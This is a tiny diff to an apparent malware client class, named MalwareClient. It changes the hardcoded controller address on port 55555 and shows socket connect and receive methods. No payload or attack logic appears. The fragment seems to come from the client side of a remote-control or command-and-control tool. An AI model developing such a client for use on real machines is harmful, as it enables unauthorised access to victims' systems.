@@ -14,7 +14,7 @@ class MalwareClient:
         else:
             self.sock = sock
 
-    def connect(self, host = "192.168.1.108", port = 55555):
+    def connect(self, host = "192.168.1.101", port = 55555):
         self.sock.connect((host, port))
 
     def receive(self, bufSize = 20480):
